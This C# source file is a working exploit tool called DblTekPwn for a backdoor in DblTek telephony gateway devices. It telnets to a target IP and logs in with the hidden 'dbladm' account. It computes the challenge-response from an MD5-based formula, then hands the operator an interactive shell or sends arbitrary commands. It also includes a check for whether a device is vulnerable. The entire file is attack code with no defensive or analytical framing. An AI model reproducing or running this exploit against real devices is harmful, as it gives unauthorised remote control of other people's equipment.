using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace DblTekPwn
{
    public class DblTekPwn
    {
        public static string ComputeResponse(int challenge)
        {
            string modified = (challenge + 20139 + (challenge >> 3)).ToString();

            byte[] buffer = new byte[64];

            for (int i = 0; i < modified.Length; i++)
                buffer[i] = (byte)modified[i];

            MD5 md5 = MD5.Create();
            byte[] hash = md5.ComputeHash(buffer);

            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < 6; i++)
                sb.Append(hash[i].ToString("X"));

            return sb.ToString().ToLower();
        }

        private Process process;

        public DblTekPwn(string ip, int port = 23)
        {
            process = new Process
            {
                StartInfo =
                {
                    FileName = "telnet",
                    Arguments = ip,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    ErrorDialog = false
                }
            };

            process.Start();
        }

        public void Shell()
        {
            var standardOutput = process.StandardOutput;
            var standardInput = process.StandardInput;
            standardInput.AutoFlush = true;
            standardInput.WriteLine("dbladm");
            for (int i = 0; i < 8; i++)
                Console.WriteLine(standardOutput.ReadLine());

            string challengeLine = standardOutput.ReadLine();
            Console.WriteLine(challengeLine);
            if (!challengeLine.StartsWith("challenge: N"))
            {
                Console.WriteLine("Device is not vulnerable!");
                Environment.Exit(0);
            }

            int challenge = Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1));
            standardInput.WriteLine(ComputeResponse(challenge));

            new Thread(() => shellOutputThread(standardOutput)).Start();
            while (true)
                process.StandardInput.WriteLine(Console.ReadLine());
        }

        private void shellOutputThread(TextReader reader)
        {
            while (true)
                Console.WriteLine(reader.ReadLine());
        }

        public bool SendCommands(params string[] commands)
        {
            Thread checker = new Thread(() => processTimeoutThread(process));
            checker.Start();

            try
            {
                var standardOutput = process.StandardOutput;
                var standardInput = process.StandardInput;
                standardInput.AutoFlush = true;
                standardInput.WriteLine("dbladm");
                for (int i = 0; i < 8; i++) standardOutput.ReadLine();

                string challengeLine = standardOutput.ReadLine();

                if (!challengeLine.StartsWith("challenge: N"))
                    return false;

                int challenge = Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1));
                standardInput.WriteLine(ComputeResponse(challenge));

                foreach (string command in commands)
                    standardInput.WriteLine(command);
            }
            catch
            {
                return false;
            }
            finally
            {
                checker.Abort();
                try
                {
                    process.Kill();
                }
                catch
                {
                }
            }
            return true;
        }

        public bool TestLogin()
        {
            Thread checker = new Thread(() => processTimeoutThread(process));
            checker.Start();

            try
            {
                var standardOutput = process.StandardOutput;
                var standardInput = process.StandardInput;
                standardInput.AutoFlush = true;
                standardInput.WriteLine("dbladm");
                for (int i = 0; i < 8; i++) standardOutput.ReadLine();

                string challengeLine = standardOutput.ReadLine();

                if (challengeLine.StartsWith("challenge: N"))
                    return true;
                return false;
            }
            catch
            {
                return false;
            }
            finally
            {
                checker.Abort();
                try
                {
                    process.Kill();
                }
                catch
                {
                }
            }
        }

        private void processTimeoutThread(Process process)
        {
            Thread.Sleep(15000);
            process.Kill();
        }
    }
}
